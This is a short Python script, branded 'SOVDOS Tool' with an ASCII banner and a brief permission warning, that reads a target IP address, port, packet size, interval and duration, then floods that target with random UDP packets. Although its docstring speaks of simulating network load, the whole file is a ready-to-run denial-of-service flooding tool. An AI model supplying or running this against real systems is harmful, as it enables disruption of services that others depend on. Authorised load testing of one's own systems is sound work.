#!/usr/bin/env python3

import socket
import random
import time
import threading


def banner():
    print("""
  █████████     ███████    █████   █████ ██████████      ███████     █████████ 
 ███░░░░░███  ███░░░░░███ ░░███   ░░███ ░░███░░░░███   ███░░░░░███  ███░░░░░███
░███    ░░░  ███     ░░███ ░███    ░███  ░███   ░░███ ███     ░░███░███    ░░░ 
░░█████████ ░███      ░███ ░███    ░███  ░███    ░███░███      ░███░░█████████ 
 ░░░░░░░░███░███      ░███ ░░███   ███   ░███    ░███░███      ░███ ░░░░░░░░███
 ███    ░███░░███     ███   ░░░█████░    ░███    ███ ░░███     ███  ███    ░███
░░█████████  ░░░███████░      ░░███      ██████████   ░░░███████░  ░░█████████ 
 ░░░░░░░░░     ░░░░░░░         ░░░      ░░░░░░░░░░      ░░░░░░░     ░░░░░░░░░  
                                                                               
                            SOVDOS Tool
        WARNING: Use responsibly and only with permission.
    """)


def udp_flood(target_ip, target_port, packet_size, interval, duration):
    """
    Creates a UDP packet flood to simulate network load.
    Arguments:
        target_ip: str - The IP address to send packets to.
        target_port: int - The port number to send packets to.
        packet_size: int - The size of each packet in bytes.
        interval: float - Delay between packets in seconds.
        duration: int - Duration of the flood in seconds.
    """
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)
    
    end_time = time.time() + duration  

    
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
            time.sleep(interval)  
        except Exception as e:
            print(f"Error: {e}")
            break


def main():
    banner()  
    
    
    target_ip = input("Enter Target IP: ")
    target_port = int(input("Enter Target Port: "))
    packet_size = int(input("Enter Packet Size (bytes): "))
    interval = float(input("Enter Interval between packets (seconds): "))
    duration = int(input("Enter Duration of flood (seconds): "))
    
    print("\nStarting UDP flood...")
    udp_flood(target_ip, target_port, packet_size, interval, duration)
    print("\nFlood completed.")

if __name__ == "__main__":
    main()
